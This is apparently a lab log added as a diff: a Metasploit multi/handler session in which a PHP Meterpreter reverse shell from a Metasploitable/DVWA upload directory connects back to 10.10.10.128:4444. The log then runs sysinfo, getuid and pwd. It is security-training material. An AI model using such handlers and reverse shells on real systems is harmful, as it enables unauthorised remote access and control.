@@ -1,0 +1,22 @@
+msf > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) > set PAYLOAD php/meterpreter_reverse_tcp
+PAYLOAD => php/meterpreter_reverse_tcp
+msf exploit(multi/handler) > set LHOST 10.10.10.128
+LHOST => 10.10.10.128
+msf exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.10.10.128:4444 
+[*] Meterpreter session 1 opened (10.10.10.128:4444 -> 10.10.10.101:60205) at 2026-09-30 12:40:19 -0400
+
+meterpreter > sysinfo
+Computer     : metasploitable
+OS           : Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+Architecture : i686
+Meterpreter  : php/linux
+meterpreter > getuid
+Server username: www-data
+meterpreter > pwd
+/var/www/dvwa/hackable/uploads
+meterpreter > 
